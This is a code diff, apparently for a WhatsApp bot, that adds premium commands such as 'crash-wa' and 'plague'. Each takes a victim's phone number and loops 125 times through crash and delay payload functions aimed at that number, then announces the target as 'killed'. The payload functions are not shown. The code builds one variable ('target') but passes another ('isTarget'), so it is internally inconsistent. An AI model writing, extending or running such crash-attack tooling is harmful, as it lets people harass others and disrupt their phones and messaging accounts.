@@ -1,0 +1,29 @@
+case "vimpire":
+case "crash-wa":
+case "invisible-delays":
+case "plague": {
+if (!isPremium) return m.reply(mess.premium);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} +2547941xxxxxxxx`);
+target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+await james.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
+await james.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
+m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 \`\n\n> *© by vimpire killer client *`);
+
+          for (let i = 0; i < 125; i++) {
+          
+            
+await sleep(5000)
+await superdelayinvid(isTarget)  
+await sleep(5000)
+await superdelayinvid(isTarget)
+await superdelayinvid(isTarget)
+await superdelayinvid(isTarget)
+await sleep(5000)
+await bulldozer(isTarget)
+await Delay2(isTarget);
+        }
+
+    }
+  
+break;
+}
